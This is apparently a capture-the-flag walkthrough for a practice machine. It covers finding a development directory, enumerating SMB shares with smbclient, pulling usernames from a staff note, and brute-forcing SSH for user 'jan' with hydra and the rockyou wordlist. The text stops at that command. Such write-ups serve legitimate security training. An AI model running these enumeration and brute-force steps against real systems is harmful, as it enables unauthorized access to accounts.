This is a machine that allows you to practise web app hacking and privilege escalation.

## Task 1. Web App Testing and Privilege Escalation

In these set of tasks you'll learn the following:

* brute forcing
* hash cracking 
* service enumeration
* Linux Enumeration

The main goal here is to learn as much as possible. Make sure you are connected to our network using your OpenVPN configuration file.

Credits to Josiah Pierce from Vulnhub.

Task Completed

### Just found development directory ```10.10.50.222/development/```
### Let manually check each...

### as i open first dev.txt i found msg,
### The message -k passing to -j about config of SMB and Apache maybe k and j are user. let open another.
### Again k passing message to J about /etc/shadow have weak credentials and they are easily crackable hashes.

## Checking SMB to get Some credentials
```sudo apt install smbclient -y``` ```[ -L ] option use below is for mapping```
```
$ smbclient -L 10.10.50.222

### So there is a text file "staff.txt" so download it on our system
```get command use to download file```
```bash

  staff.txt                           N      173  Thu Apr 19 22:59:55 2018

		14318640 blocks of size 1024. 11087940 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> 
```
### Let read the txt file we got from smb
```bash
$ cat staff.txt      
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```
### So ```kay``` and ```Jan``` are two user and ```jan``` system password are week 
## Let brute-force SSH service
### As we know ip and username let brute it.
``` sudo apt install hydra -y ```
```bash
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.50.222 -t 50
